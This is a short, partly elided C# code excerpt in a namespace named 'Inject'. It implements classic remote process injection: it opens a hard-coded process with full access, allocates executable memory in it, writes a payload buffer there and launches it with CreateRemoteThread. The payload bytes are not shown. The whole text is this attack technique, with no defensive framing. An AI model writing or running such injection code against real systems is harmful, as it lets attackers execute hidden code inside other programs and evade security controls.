...
namespace Inject
{
    class Program
    {
        ...
        {
            IntPtr hHandle = OpenProcess(0x001F0FFF, false, 4744);
            IntPtr address = VirtualAllocEx(hHandle, IntPtr.Zero, 0x1000, 0x3000, 0x40);
            ...
            IntPtr outSize;
            WriteProcessMemory(hHandle, address, buf, buf.Length, out outSize);
            IntPtr hThread = CreateRemoteThread(hHandle, IntPtr.Zero, 0, address, IntPtr.Zero, 0, IntPtr.Zero);
